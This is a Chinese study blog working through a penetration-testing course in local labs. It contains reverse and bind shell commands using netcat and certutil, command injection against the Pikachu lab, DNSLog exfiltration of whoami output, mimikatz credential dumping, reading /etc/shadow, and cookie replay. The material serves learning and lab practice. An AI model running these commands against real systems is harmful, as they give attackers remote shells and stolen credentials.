新手来看小迪

这个只是记录本人需要做笔记和复现的，其他了解的就没做很详细

<br/>

# 基础入门总思维导图

![image-20250606165452123](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084204137-57409208.png)

<br/>

# 第2天：基础入门-Web架构_前后端分离站_Docker容器站_集成软件站_建站分配



## 权限差异

### 宝塔面板

命令不能执行

文件目录不能查看网站之外的





### IIS网站

可以执行命令和查看文件目录

[IIS Web服务器安装配置教程(图文)---IIS配置(win10) - pwindy - 博客园](https://www.cnblogs.com/pwindy/p/18431875)





### phpstudy

部分可以部分不行



### docker->tomcat

虽然可以执行命令和查看文件目录，但只是进入了容器内部，不是真正的，涉及到docker逃逸

<br/>

# 第3天：基础入门-Web架构_OSS存储_负载均衡_CDN加速_反向代理_WAF防护



## WAF

防护网站防止被攻击，有绕过手段但也不是所有的waf都能绕过

例：D盾



## CDN

节点，每个地方去访问一个网站可能都不是同一个ip，需要我们找到真正的ip地址



## OSS

存储用的，文件上传不会解析所以没有文件上传漏洞，但是有accesskey漏洞安全问题



## 反向代理

访问的目标只是一个代理，不是真正的服务器



## 负载均衡

一个服务器分好几个，存在多个目标

<br/>

# 第4天：基础入门-APP架构_小程序_H5+Vue语言_Web封装_原生开发_Flutter



## web

ShopXO源码程序+一门app打包

常规web测试

### APP

宝塔一键部署

![image-20250524101500740](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170025011-387309996.png)

网站目录设置为/www/wwwroot/akaashitest1.com/public

![image-20250524101624098](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170025761-810919873.png)





### 小程序



## 原生开发

全程自己编写，更复杂但是功能和分类更多更好

反编译加抓包

常规的apk包，可以放jadx查看源码



## H5

html5开发的

HBuilderX搭建，这个需要去注册一个微信小程序账号和下载微信开发者工具

### 小程序

新建项目

![image-20250520164840798](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170026219-183574686.png)

名称，目录还有模板

![image-20250520164857554](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170026681-180358601.png)

记得写上id还有基础配置里面的id获取

![image-20250524182900181](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524182949670-88913436.png)

右键点击 uniCloud 文件夹，点击“关联云服务空间或项目”

![image-20250520172744442](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170027419-1258503320.png)

点新建

![image-20250520173224471](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170027764-802447453.png)

到界面后新建按操作买免费的就好了

![image-20250520174317426](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170028112-1710359636.png)

右键发行小程序-微信

![image-20250520164926864](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170028452-2051669428.png)

微信开发者服务端口记得打开，设置->安全设置->服务端口

![image-20250520175640352](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170028863-20085849.png)

![image-20250520180358673](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170029183-1144110981.png)

### *APP

[HbuilderX打包app，Hbuilder怎么打包app，H5打包成app，H5怎么打包成app-CSDN博客](https://blog.csdn.net/LIUAWEIO/article/details/88719446)

<br/>

# 第5天：基础入门-反弹SHELL&不回显带外&正反向连接&防火墙出入站&文件下载



## 文件上传下载

虚拟机在要下载的文件目录下面打开cmd

并且执行：

```
python -m http.server 8000
```

这会让虚拟机成为一个 web 服务器

![image-20250522110637884](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170029527-386994155.png)

棱角社区生成命令

![image-20250522110650721](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170029862-105615309.png)

找到命令

```
certutil.exe -urlcache -split -f http://172.22.173.181:8000/1.txt 1.txt
```

主机执行

![image-20250522110715665](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170030277-1580121235.png)

文件下载完成

Linux也是一样的

```
curl http://172.22.173.181:8000/1.txt -o 1.txt
```

![image-20250522110827134](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170030613-2066773023.png)



## 反弹shell

### 正向连接：本地监听等待对方连接让对方操作本地

**Linux->Windows**

```
nc -e cmd -lvvp 5566
```

| 参数         | 含义                                                         |
| ------------ | ------------------------------------------------------------ |
| `nc`         | Netcat 命令行工具（功能强大的 TCP/UDP 网络调试工具）         |
| `-e cmd`     | **执行 cmd.exe（Windows 的命令行）**，把这个 shell 接入 socket 连接 |
| `-l`         | 监听模式（listen）                                           |
| `-v`         | 显示详细信息（verbose）                                      |
| `-v`（重复） | 更详细（very verbose）                                       |
| `-p 5566`    | 在本地 **5566 端口监听**                                     |

绑定cmd到本地5566端口

```
nc -e cmd -lvvp 5566
```

![image-20250522113753138](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170030931-1347621240.png)

kali用nc进行连接

![image-20250522113738395](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170031287-1788812727.png)

可以发现到了win10的c盘下面



**windows->Linux**

需要先查看kali开放了哪些端口

```
sudo ufw status
```

![image-20250523121649884](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170031623-236702500.png)

绑定sh

```
nc -e /bin/sh -lvp 80
```

![image-20250523121857175](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170031984-804637770.png)

win10监听

```
nc 172.22.161.122 80
```

![image-20250523121956011](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170032332-2023300928.png)



### 反向连接：先监听，等对方绑定端口后操作对方

**Windows->Linux**

win10先监听5566端口

```
nc -lvp 5566
```

![image-20250523114224072](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170032698-142952557.png)

kali把自己的sh绑定到win10端口上

```
nc -e /bin/sh 172.22.173.181 5566
```

![image-20250523114236235](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170033001-668301715.png)

win10操作kali的终端：

![image-20250523114254619](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170033350-1268291467.png)



**Linux->windows**

kali监听端口

```
nc -lvp 80
```

![image-20250523122121679](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170033727-1780185198.png)

win10的cmd绑定到kali的端口

```
nc -e cmd 172.22.161.122 80
```

kali操作win10

![image-20250523122436217](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170034065-6921708.png)



### 内外网

**外->内**

外网的一台计算机要控制内网的一台计算机，需要内网的去找外网的，也就是反向连接

因为外网的ip是全球唯一的，外网去找内网找到的是内网出去的，再下去内网找就找不到那个具体的

需要外网的先监听，然后内网的把cmd绑到外网的端口上让外网进行操作

![image-20250523115511200](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170034426-942556700.png)

**内->外**

这个就可以直接用正向连接，在外网把自己的cmd绑定到端口，内网直接nc连接端口

因为外网的ip是唯一的，内网连接的那个就是特定的外网



## 防火墙绕过-正向连接&反向连接&内网服务器  

管道符：

| (管道符号) 

||（逻辑或） 

&&（逻辑与） 

&(后台任务符号)  

Windows->

```
| & || &&
```

Linux->

```
; | || & && ``（特有``和;）
```

例子：  ping -c 1 127.0.0.1 ; whoami   

![image-20250523132032017](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170034788-1095722025.png)

![image-20250523132252777](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170035191-1038021158.png)

或者是直接不要127.0.0.1，直接在ping后面加上想要执行的命令

![image-20250523132443870](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170035586-841278910.png)

只有

```
``和;适用
```

### pikachu靶场示例

```
127.0.0.1 | whoami
```

![image-20250523143011955](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170035929-1789995251.png)

确定了是windows之后利用文件下载命令讲nc下载到目标机上面，C盘

这里需要在nc机上开启web服务，注意需要在nc目录下面执行

```
python -m http.server 80
```

![image-20250523152259301](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170036207-61912498.png)

```
127.0.0.1 | certutil.exe -urlcache -split -f http://172.22.165.20:80/nc.exe c:\\nc.exe
```

可以看到目标机成功下载了nc

![image-20250523152326436](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170036589-1590749557.png)

![image-20250523152402244](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170036952-1908704836.png)

再利用反向连接让目标机把cmd绑定到我们端口

```
nc -lvp 4444
127.0.0.1 | c:\\nc.exe -e cmd 172.22.165.20 4444
```

可以看到成功连接

![image-20250523152748039](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170037309-120263332.png)

## 常用监听端口推荐

| 端口号                             | 用途说明                        | 是否推荐                 | 备注                  |
| ---------------------------------- | ------------------------------- | ------------------------ | --------------------- |
| **4444**                           | 渗透测试和反弹 shell 的惯用端口 | ✅ 强烈推荐               | 默认推荐，无需权限    |
| **1234**                           | 常用调试 / Netcat 默认演示      | ✅ 推荐                   | 使用广泛              |
| **8888**                           | 用于调试 / 代理服务端口         | ✅ 推荐                   | 通常未被防火墙拦截    |
| **8080**                           | Web服务调试端口                 | ✅ 推荐                   | 常用于反弹 HTTP shell |
| **53**                             | DNS 端口，绕过限制时可用        | ⚠️ 可用但需注意           | 某些环境绕过防火墙    |
| **21** / **22** / **80** / **443** | 模拟 FTP / SSH / HTTP / HTTPS   | ⚠️ 仅在特定防火墙策略下用 | 有时可用来绕过防      |

## 防火墙

### 入站和出战

入站就是检查进来的流量，出战就是检查出去的流量

当入站被限制，比如端口被禁用了，那么就需要反向连接，把控制权给出去

当出战被限制了那就用正向连接

**入站限制**

![image-20250523155447174](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170037640-1204694127.png)

![image-20250523160620473](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170038074-978735441.png)

![image-20250523155516787](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170038390-892054937.png)

![image-20250523160700092](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170038697-1086488416.png)

## 没回显

解决方法：

### 带外回显

网站：[DNSLog Platform](http://www.dnslog.cn/)

```
ping j0ve3d.dnslog.cn
ping `whoami`.j0ve3d.dnslog.cn
```

![image-20250523171557526](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170039063-1779400648.png)

![image-20250523171620047](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170039387-193273209.png)

可以看到回显记录，但是这个只能linux适用，在windows里面我们需要用到powershell

```
powershell
$x=whoami;
$xx=$x.replace('\','xxxx');
$y='.j0ve3d.dnslog.cn';
$z=$xx+$y;
echo $z;
ping $z;
```

| 问题                       | 答案                                                  |
| -------------------------- | ----------------------------------------------------- |
| 为什么要替换 `\`？         | 因为 DNS 域名不允许使用 `\` 这样的非法字符            |
| 替换成 `xxxx` 是必须的吗？ | ❌ 不是必须，只是一个例子                              |
| 可以替换成别的字符串吗？   | ✅ 可以，只要是 DNS 合法字符就行，比如 `-`, `_`, `abc` |
| 替换不做会怎么样？         | ❌ `ping` 命令会失败，域名无效，dnslog 不会收到请求    |

![image-20250523172911366](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170039721-1301440462.png)

![image-20250523172917375](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170040045-481138285.png)

这里把pikachu靶场的回显关闭

找到文件\phpstudy_pro\WWW\pikachu\vul\rce\rce_ping.php

![image-20250523173736226](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170040374-455963336.png)

再去输入就没有回显了，在输入框输入：

```
127.0.0.1 | powershell $x=whoami;$xx=$x.replace('\','xxxx');$y='.n94843.dnslog.cn';$z=$xx+$y;ping $z;
```

记录：

![image-20250523174706544](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170040680-1558046806.png)



回显成功

### 反弹shell

就是之前一样的方法

<br/>

# 第6天：基础入门-抓包技术&HTTPS协议&APP&小程序&PC应用&WEB&转发联动



## bp在模拟器安装证书

settings导出证书

![image-20250523180854417](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170041070-72230834.png)

![image-20250523180930737](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170041419-1998990741.png)

选择保存位置，保存位bp.cer

模拟器打开共享文件夹

![image-20250523181307806](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170041828-1724301731.png)

选择证书所在目录之后点下面的安卓小人就可以看到目录了

在模拟器找到设置->网络和互联网->WLAN->WLAN偏好设置->高级->安装证书，找到我们之前的目录选择bp.cer进行安安装就好了

## Charles发送包到bp

[Charles抓包工具（破解版） - 小葛师兄 - 博客园](https://www.cnblogs.com/tester-ggf/p/13849716.html)

Charles把包发送到bp

![image-20250524125116217](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170042274-1695804099.png)

![image-20250524125204212](https://img2023.cnblogs.com/blog/3540423/202505/3540423-20250524170042569-1869028083.png)

之后的微信小程序抓包就通过用charles抓包然后发送到bp进行查看

或者本地开启了系统代理也可以抓包送到bp

## 利用 **Proxifier**转发bp对pc的软件进行抓包

[Burpsuite+Proxifier抓取exe数据包 - websec80 - 博客园](https://www.cnblogs.com/websec80/p/17475946.html)

设置代理规则来抓特定程序的包

<br/>

# 第7天：基础入门-抓包技术&全局协议&封包监听&网卡模式&APP&小程序&PC应用



## 除http和https以外的协议抓包

比如模拟器游戏，小程序游戏

用科来或者wireshark抓本地

## 科来

选择正在使用的网卡

![image-20250528113711318](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193632795-1979515600.png)

开始监听抓包

### 微信小游戏

![image-20250528113802406](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193633533-156516674.png)

![image-20250528113807056](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193634018-160592994.png)

可以看到抓到了

### 模拟器游戏

科来是一样的操作，打开模拟器游戏

![image-20250528114002769](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193634514-844458782.png)

![image-20250528114006801](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193634950-876713016.png)

也是抓到了的

![image-20250528114051619](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193635272-1279797906.png)

### pc的app

监听正在使用的网卡，打开pc的app

![image-20250528190941156](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193635688-2135618287.png)

可以看到ip和ip的地理位置

### 数据包分析

用科来就是来抓除开http和https之外的协议，所以bp不支持，只能用科来自带的生成器进行分析

![image-20250529122411414](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193636036-2112167222.png)

![image-20250529122425639](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193636369-1801267056.png)

![image-20250529122456499](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193636730-1581847734.png)

![image-20250529122514954](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193637111-1684297916.png)





## 封包工具

选择进程

![image-20250528185234672](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193637456-607629836.png)

开始监听之后就会开始抓包，点一个地方，只要有刷新出来新的东西就会有新的数据包



封包工具只能在模拟器的app里面可以抓到，其他的不行



## 渗透测试

抓包得到应用的资产信息-IP，域名等



利用IP和域名上的服务器做测试（

web web攻防

端口-数据库 第三方软件等 其他服务攻防

）



API接口 oss资源-云安全



## 逆向破解

反编译源码中去找资产信息 -> 渗透测试，后面与渗透测试一致

源码中泄露的key，去测试安全性

逆向，代码和产品的设计逻辑安全（不规范加密，可以绕过的策略，自己删除验证重打包绕过验证等）

<br/>

# 第8天：基础入门-算法分析&传输加密&数据格式&密文存储&代码混淆&逆向保护



数据传输不是简单的明文传输，有时候会做编码加密

在做测试的时候收集到的是编码加密过的的话，后续进行测试，payload也需要进行相同的编码



## 常见的传输格式

json&xml



## 密码加密



### zzzcms演示

用phpstudy搭建zzzcms，用Navicat连接本地数据库查看用户

在pre_ucenter_members表里面

![image-20250601105037003](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193638158-1326582087.png)

可以发现有盐值

![image-20250601105416435](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193638491-1836494666.png)

md5+salt



### Discuz3.2演示

也是在phpstudy搭建

![image-20250601102921093](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193638845-2076048072.png)

![image-20250601102931479](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193639347-1344774709.png)

也是md5加密



### DIscuz3.5演示

![image-20250601105508054](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193639667-1107395784.png)

这里的密文就不是简单的md5加密了，bcrypt 哈希加密（不是可逆加密，而是哈希）

Bcrypt 哈希的结构一般是这样的：

```
$2y$10$OgIP9HbdJlqXY6XrK6y7oOQ0pGyhJDqypor1jTHGOfhNxJbXNNY9q
 └┬┘ └┬┘ └─────────────┬────────────────────────────────────┘
  │    │             Salt + 密文部分（base64编码）
  │    └─ 工作因子（cost factor），即加密轮数是 2^10 = 1024
  └─ 哈希标志（$2y 是 bcrypt 的一种变体）
```

**$2y$**：标志使用的是 bcrypt 算法的一种版本（其他版本还包括 `$2a$`、`$2b$` 等）。

**10**：cost factor，表示计算复杂度，数字越大越慢、更安全。

剩余部分是用 bcrypt 算法生成的哈希值，包含 salt 和密码的哈希值。



### windows

mimikatz工具查看

启动

```
privilege::debug
```

提升 Mimikatz 的权限，使其能够访问某些受保护的进程和内存区域

```
sekurlsa::logonpasswords full
```

用于提取当前系统中所有用户的登录凭证信息，包括明文密码、密码哈希、Kerberos 票据等

![image-20250601111501870](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193640189-467014548.png)

这里可以看到这些

#### **msv :**

- MSV（MSV1_0）模块是 Windows 的 NTLM 认证模块。
- 这是最常见的凭据类型，尤其是本地登录或远程桌面登录（RDP）后。

```
pgsql复制编辑[00000003] Primary           <-- 表示是一个主登录会话（LogonSession ID）
* Username : Administrator   <-- 当前用户
* Domain   : WIN-AGPMHM94DDK <-- 所属域（或主机名）
* NTLM     : 4b34f009686328c43587b910abc49ec7 <-- NTLM 哈希（可用于横向移动）
* SHA1     : 0fa08b4a9efd07e05288d89761d92d598acbb62b <-- SHA1版本的密码哈希
* DPAPI    : 0fa08b4a9efd07e05288d89761d92d59 <-- 用于解密受保护数据（如浏览器密码）
```

✅ 最关键的是 **NTLM 哈希**，可以用于 **Pass-the-Hash（PTH）攻击**。

```
4b34f009686328c43587b910abc49ec7
```

可以拿去md5解密



### linux

```
cat /etc/shadow
```

查看shadow文件

![image-20250601112114411](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193640675-1273118644.png)



## 源码加密

### php文件演示

网站目录下的1.php写入：

```
<?php phpinfo();?>
```

访问

![image-20250601113508228](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193641180-1424870233.png)

对1.php文件进行加密变成

```
<?php
//Obfuscate by https://uutool.cn/php/
 phpinfo();


```

访问和之前的一样界面



## jsfuck

![image-20250601114106427](https://img2023.cnblogs.com/blog/3540423/202506/3540423-20250601193641552-2086076940.png)

<br/>

# 第9天：基础入门-算法逆向&散列对称非对称&JS源码逆向&AES&DES&RSA&SHA

我自己整理的一些编码合集：[目前遇到过的编码 - Anaxa - 博客园](https://www.cnblogs.com/Anaxa/articles/18522651)

```
安全测试中：
密文-有源码直接看源码分析算法（后端必须要有源码才能彻底知道）
密文-没有源码1、猜识别 2、看前端JS（加密逻辑是不是在前端）
#算法加密-概念&分类&类型
1. 单向散列加密 -MD5 
单向散列加密算法的优点有(以MD5为例)：
方便存储，损耗低：加密/加密对于性能的损耗微乎其微。
单向散列加密的缺点就是存在暴力破解的可能性，最好通过加盐值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解的。
常见的单向散列加密算法有：
MD5 SHA MAC CRC

2. 对称加密 -AES
对称加密优点是算法公开、计算量小、加密速度快、加密效率高。
缺点是发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。
常见的对称加密算法有：
DES AES RC4

3. 非对称加密 -RSA
非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。
缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。
常见的非对称加密算法：
RSA RSA2 PKCS

#加密解密-识别特征&解密条件
MD5密文特点：
1、由数字“0-9”和字母“a-f”所组成的字符串
2、固定的位数 16 和 32位
解密需求：密文即可，但复杂明文可能解不出

BASE64编码特点：
0、大小写区分，通过数字和字母的组合
1、一般情况下密文尾部都会有两个等号，明文很少的时候则没有
2、明文越长密文越长，一般不会出现"/""+"在密文中

AES、DES密文特点：
同BASE64基本类似，但一般会出现"/"和"+"在密文中
解密需求：密文，模式，加密Key，偏移量，条件满足才可解出

RSA密文特点：
特征同AES,DES相似，但是长度较长
解密需求：密文，公钥或私钥即可解出

其他密文特点见：
1.30余种加密编码类型的密文特征分析（建议收藏）
https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd

2.CTF中常见密码题解密网站总结（建议收藏）
https://blog.csdn.net/qq_41638851/article/details/100526839

3.CTF密码学常见加密解密总结（建议收藏）
https://blog.csdn.net/qq_40837276/article/details/83080460

#解密实例-密文存储&数据传输
1、密码存储（后端处理）
X3.2-md5&salt
DZ对应代码段-/uc_server/model/user.php
	function add_user() {
		$password = md5(md5($password).$salt);
    }
    
<?PHP
$h = 'd7192407bb4bfc83d28f374b6812fbcd';
$hash=md5(md5('123456').'3946d5');
if($h==$hash){
	echo 'ok';
}else{
	echo 'no';
}
?>

X3.5-hash
DZ对应代码段-/uc_server/model/user.php
	function add_user() {
		$salt = '';
		$password = $this->generate_password($password);
    }

	function generate_password($password) {
		$algo = $this->get_passwordalgo();
		$options = $this->get_passwordoptions();
		$hash = password_hash($password, $algo, $options);
	}

<?PHP
$hash = '$2y$10$KA.7VYVheqod8F3X65tWjO3ZXfozNA2fC4oIZoDSu/TbfgKmiw7xO';
if (password_verify('123456', $hash)) {
    echo 'ok';
} else {
    echo 'error';
}
?>

2、数据通讯
-博客登录-zblog（前端处理）
<script src="script/md5.js" type="text/javascript"></script>
$("#btnPost").click(function(){
    var strPassWord=$("#edtPassWord").val();
    $("form").attr("action","cmd.php?act=verify");
    $("#password").val(MD5(strPassWord));

```

<br/>

# 第10天：基础入门-HTTP数据包&Postman构造&请求方法&请求头修改&状态码判断



![image-20250603215831411](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084204702-221453949.png)



## request

![image-20250603215603134](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084205180-982144075.png)

## response

![image-20250603215630933](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084205766-404811105.png)

![image-20250603215647636](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084206174-429855974.png)

![image-20250603215655298](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084206459-1298583551.png)

```
 #数据-方法&头部&状态码 
-方法 
1、常规请求-Get 
2、用户登录-Post 
•get：向特定资源发出请求（请求指定页面信息，并返回实体主体）； 
•post：向指定资源提交数据进行处理请求（提交表单、上传文件），又可能导致新的资
源的建立或原有资源的修改； 
•head：与服务器索与 get 请求一致的相应，响应体不会返回，获取包含在小消息头中
的原信息（与 get 请求类 
似，返回的响应中没有具体内容，用于获取报头）； 
•put：向指定资源位置上上传其最新内容（从客户端向服务器传送的数据取代指定文档
的内容），与 post 的区别是 put 为幂等，post 为非幂等； 
•trace：回显服务器收到的请求，用于测试和诊断。trace 是 http8 种请求方式之中
最安全的 l 
•delete：请求服务器删除 request-URL 所标示的资源*（请求服务器删除页面） 
•option：返回服务器针对特定资源所支持的 HTML 请求方法 或 web 服务器发送*测试
服务器功能（允许客户 端查看服务器性能）； 
•connect ： HTTP/1.1 协议中能够将连接改为管道方式的代理服务器 
 
-参数 
演示： 
1、UA 头-设备平台 
2、Cookie-身份替换 
 
-Response 状态码 
1、数据是否正常 
2、文件是否存在 
3、地址自动跳转 
4、服务提供错误 
注：容错处理识别 
•-1xx:指示信息—表示请求已接收，继续处理。 
•-2xx:成功—表示请求已经被成功接收、理解、接受。 
•-3xx:重定向—要完成请求必须进行更进一步的操作。 
•-4xx:客户端错误—请求有语法错误或请求无法实现。 
•-5xx:服务器端错误—服务器未能实现合法的请求。 
•200 OK：客户端请求成功 
•301 redirect：页面永久性移走，服务器进行重定向跳转；
```

## 电脑浏览器和模拟器中的浏览器

电脑

![image-20250604214409890](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084206771-398702213.png)

![image-20250604213418745](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084207045-1469626818.png)

模拟器

![image-20250604214357477](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084207413-1860563977.png)

![image-20250604214015218](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084207729-778379860.png)

把手机的发送到电脑，显示为手机界面格式

![image-20250604214319441](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084208016-969344723.png)

在模拟器抓的包用电脑去访问和在模拟器显示的数据是不一样的：

电脑显示的

![image-20250604215317174](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084208347-157667752.png)

模拟器显示的

![image-20250604215525261](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084208708-1149417999.png)

## cookie

当之前在这个网站保存或者登录过的，在下一次再次访问的时候会直接自动登录

这个浏览器已经登录了后台

![image-20250604220907360](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084209002-1576913576.png)

后面再次访问这个网站也是直接登录，但是相同的地址其他浏览器访问就会显示没登陆

![image-20250604220955914](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084209275-1800205529.png)

没登陆抓的包

```
GET /admin.php HTTP/1.1
Host: discuz5:4509
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 9; ASUS_I005DA Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Lfnr_2132_saltkey=qycs0ttw; Lfnr_2132_lastvisit=1749042692; Lfnr_2132_sid=GIuGGZ; Lfnr_2132_lastact=1749046292%09admin.php%09; Lfnr_2132_darkmode=la
Connection: close
```

登录之后抓的包

```
GET /admin.php HTTP/1.1
Host: discuz5:4509
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Lfnr_2132_saltkey=EOHYq0Iw; Lfnr_2132_lastvisit=1749042579; Lfnr_2132_sid=l9Qqoj; Lfnr_2132_lastact=1749046255%09admin.php%09; Lfnr_2132_darkmode=la; Lfnr_2132_sendmail=1; Lfnr_2132_seccodecSl9Qqoj=3.eb941eabda012ea4ff; Lfnr_2132_ulastactivity=4c195O8tviIP1b9nvGXyL3qzXE5xC7uyZyTjirExQ7QYqIjtkPHO; Lfnr_2132_auth=c39dYhv9ec1xLeFnr2b12HQXB3eHk5M3uYHrmrWB7Wx15euxZ1BXFHoTIOQLlSsI1yrafRq2s%2FZhzhAbqlOi; Lfnr_2132_lastcheckfeed=1%7C1749046246; Lfnr_2132_checkfollow=1; Lfnr_2132_lip=127.0.0.1%2C1749046118
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

可以发现Cookie不一样，登录过的Cookie多了很多东西，我们把登陆过的Cookie放进没登陆的之后放包

![image-20250604221309344](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084209591-533380370.png)

可以发现没登陆的这里也是直接显示登录了

## 状态码

根据文件判断：

200 文件存在

404 文件不存在

403 文件夹存在

500 可能存在可能不存在

3xx 可能存在可能不存在

- 容错处理 网站访问错误就自动跳转到某个页面 不存在
- 访问某个文件 自动触发跳转 存在

网站根目录

![image-20250606103045734](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084209865-864565455.png)

访问index.php，301

![image-20250606103100925](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084210140-136519347.png)

admin.php，200

![image-20250606103141438](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084210438-419934480.png)

abc.php，404

![image-20250606103227785](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084210742-1174817616.png)

api文件夹，403

![image-20250606103833650](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084211003-27760766.png)

## bp对路径进行爆破

先抓一个包

![image-20250606110841027](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084211291-1419306409.png)

发送到Intruder，选中路径，clear之后点add

![image-20250606110939224](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084211597-1910468568.png)

点load把字典放进去，然后开始爆破

![image-20250606111150609](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084211967-726669866.png)

看结果

![image-20250606111559010](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084212251-953482012.png)

通过状态码来判断文件是否存在

## 御剑后台扫描

自动化

